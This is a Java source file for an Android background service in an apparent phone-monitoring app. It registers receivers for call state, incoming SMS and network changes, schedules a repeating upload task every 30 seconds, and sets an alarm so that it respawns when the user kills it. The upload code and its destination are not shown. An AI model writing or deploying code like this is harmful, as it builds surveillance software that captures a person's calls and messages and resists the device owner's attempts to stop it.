package com.monitor.phone.s0ft.phonemonitor;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.os.SystemClock;
import android.util.Log;

import java.util.Timer;


public class MainService extends Service {

    private static CallStateBroadcastReceiver callStateBroadcastReceiver;
    private static SMSBroadcastReceiver smsBroadcastReceiver;
    private static NetworkChangeBroadcastReceiver networkChangeBroadcastReceiver;
    private static final double UPLOAD_INTERVAL = 0.5;//in minutes


    @Override
    public void onCreate() {
        Log.w(AppSettings.getTAG(), "Service created");

        /*Setup a repeating Alarm to respawn this service(in case process is killed by Android or by user) at a fixed interval(here, 3 minutes)*/
        Intent intent = new Intent(this, this.getClass());
        PendingIntent pendingIntent = PendingIntent.getService(this, 0, intent, 0);
        AlarmManager alarmManager = null;
        alarmManager = (AlarmManager) this.getSystemService(ALARM_SERVICE);
        if (alarmManager != null) {
            alarmManager.cancel(pendingIntent);//kill any pre-existing alarms
            alarmManager.setInexactRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + AlarmManager.INTERVAL_FIFTEEN_MINUTES / 5, AlarmManager.INTERVAL_FIFTEEN_MINUTES / 5, pendingIntent);
        }

        /*Setup the phone call broadcast receiver*/
        callStateBroadcastReceiver = new CallStateBroadcastReceiver();
        IntentFilter intentFilterPhonestate = new IntentFilter();
        intentFilterPhonestate.addAction("android.intent.action.PHONE_STATE");
        registerReceiver(callStateBroadcastReceiver, intentFilterPhonestate);

        /*Setup the sms broadcast receiver*/
        smsBroadcastReceiver = new SMSBroadcastReceiver();
        IntentFilter intentFilterSmsreceived = new IntentFilter();
        intentFilterSmsreceived.addAction("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(smsBroadcastReceiver, intentFilterSmsreceived);

        /*Setup the connectivity broadcast receiver*/
        networkChangeBroadcastReceiver = new NetworkChangeBroadcastReceiver();
        IntentFilter intentFilterNetworkChanged = new IntentFilter();
        intentFilterNetworkChanged.addAction("android.net.conn.CONNECTIVITY_CHANGE");
        registerReceiver(networkChangeBroadcastReceiver, intentFilterNetworkChanged);

        /*Fire up the RepeatTask class in a timer*/
        RepeatTask repeatTask = new RepeatTask(this);
        try {
            new Timer().scheduleAtFixedRate(repeatTask, 0, (long) (UPLOAD_INTERVAL * 60 * 1000));
        } catch (IllegalStateException ise) {
            Log.w(AppSettings.getTAG(), ise.getMessage());
        }

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return Service.START_STICKY;
    }

    @Override
    public void onDestroy() {
        Log.w(AppSettings.getTAG(), "Service about to be destroyed");
        unregisterReceiver(callStateBroadcastReceiver);
        unregisterReceiver(smsBroadcastReceiver);
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

}
